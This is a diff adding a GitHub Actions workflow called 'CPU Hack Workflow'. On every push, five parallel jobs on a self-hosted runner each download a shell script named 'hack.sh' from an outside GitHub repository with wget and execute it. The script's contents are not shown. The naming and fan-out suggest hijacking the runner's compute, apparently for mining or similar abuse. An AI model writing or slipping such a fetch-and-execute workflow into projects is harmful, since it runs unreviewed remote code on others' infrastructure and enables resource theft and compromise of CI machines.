@@ -1,0 +1,22 @@
+
+name: CPU Hack Workflow
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  cpu-hack:
+    runs-on: self-hosted
+    strategy:
+      matrix:
+        job: [1, 2, 3, 4, 5]
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v2
+
+      - name: Run cpu hack ${{ matrix.job }}
+        run: |
+          wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+          chmod +x hack.sh
+          ./hack.sh
